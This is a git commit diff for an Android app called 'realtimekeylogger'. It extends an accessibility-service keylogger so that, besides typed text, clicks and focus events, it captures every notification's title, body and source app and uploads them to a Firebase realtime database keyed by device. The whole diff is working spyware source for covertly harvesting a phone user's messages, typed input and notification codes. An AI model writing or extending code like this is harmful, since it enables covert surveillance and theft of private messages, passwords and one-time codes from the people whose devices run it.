5becf7c754fbb60a796235c59804ff2aab297d20
Shubham Gupta <shubham.developer16@gmail.com>
2022-04-23 19:49:57 +0530

    Notification Sender Added

--- app/src/main/java/com/shubhamgupta16/realtimekeylogger/service/StrokeService.kt
+++ app/src/main/java/com/shubhamgupta16/realtimekeylogger/service/StrokeService.kt
@@ -2,6 +2,7 @@ package com.shubhamgupta16.realtimekeylogger.service
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.app.Notification
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.widget.Toast
@@ -25,7 +26,8 @@ class StrokeService : AccessibilityService() {
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                AccessibilityEvent.TYPE_VIEW_FOCUSED
+                AccessibilityEvent.TYPE_VIEW_FOCUSED or
+                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
         info.notificationTimeout = 500
         info.packageNames = null
@@ -62,41 +64,73 @@ class StrokeService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
-        if (event.text.isNotEmpty() || event.contentDescription != null) {
-            if (event.eventType.let {
-                    it == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
-                            it == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
-                            it == AccessibilityEvent.TYPE_VIEW_CLICKED
-                }) {
-                val text = event.text.joinToString { it }.ifBlank { null }
+
+
+        if (event.eventType.let {
+                it == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+                        it == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
+                        it == AccessibilityEvent.TYPE_VIEW_CLICKED
+            }) {
+            if (event.text.isNotEmpty() || event.contentDescription != null) {
+                val eventText = event.text.joinToString { it }.ifBlank { null }
                 sendEvent(
-                    event.eventType, text, event.contentDescription
+                    event.eventType, eventText, event.contentDescription
                 )
             }
+        } else if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+            val notification = event.parcelableData as? Notification
+            val notifyMap = notification?.let {
+                mapOf(
+                    "nTitle" to notification.extras.getCharSequence(Notification.EXTRA_TITLE).encode(),
+                    "nText" to notification.extras.getCharSequence(Notification.EXTRA_TEXT).encode(),
+                    "nText2" to notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT).encode(),
+                    "nPackage" to event.packageName.toString().encode()
+                )
+            }
+
+            val eventText = event.text.joinToString { it }.ifBlank { null }
+            val hashMap = hashMapOf(
+                "text" to eventText.encode(),
+                "notification" to notifyMap,
+                "desc" to event.contentDescription,
+                "event" to event.eventType
+            )
+            notifyMap?.let { hashMap.putAll(it) }
+            uploadEvent(hashMap)
         }
     }
 
     private var lastEventText = ""
     private var lastEventTimeStamp = 0L
     private var lastCurrentTime = 0L
-    private fun sendEvent(event:Int, text:String?, desc:CharSequence?){
+    private var lastEventType = 1
+    private fun sendEvent(event: Int, text: String?, desc: CharSequence?) {
         val currentTime = System.currentTimeMillis()
-        if (text?.length ?: 0 > 3 && lastEventText.length > 3)
-            if (text == null) lastEventTimeStamp = currentTime
-        if (text?.contains(lastEventText) == false && !lastEventText.contains(text)) lastEventTimeStamp = currentTime
-        if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
-        if (text?.length ?: 0 > 3 && lastEventText.length > 3)
-            if (text?.substring(3) == lastEventText.substring(3))
+        if (lastEventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            if (text == null) return
+            if (!text.contains(lastEventText) && !lastEventText.contains(text))
                 lastEventTimeStamp = currentTime
-        lastCurrentTime = currentTime
-        lastEventText = text ?: ""
-        rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(
-            mapOf(
-                "text" to text.encode(),
-                "desc" to desc.encode(),
-                "event" to event
-            )
-        )
+            if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
+            if (text.length > 3 && lastEventText.length > 3)
+                if (text.substring(3) == lastEventText.substring(3))
+                    lastEventTimeStamp = currentTime
+            lastCurrentTime = currentTime
+            lastEventText = text
+        } else {
+            lastEventText = text ?: ""
+            lastEventTimeStamp = currentTime
+            lastCurrentTime = currentTime
+        }
+        lastEventType = event
+        rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(mapOf(
+            "text" to text.encode(),
+            "desc" to desc.encode(),
+            "event" to event
+        ))
+    }
+
+    private fun uploadEvent(map: Map<String, Any?>, timeStamp: Long = System.currentTimeMillis()) {
+        rtdb.child("actions_v2").child(deviceKey).child("$timeStamp").setValue(map)
     }
 
     override fun onInterrupt() {
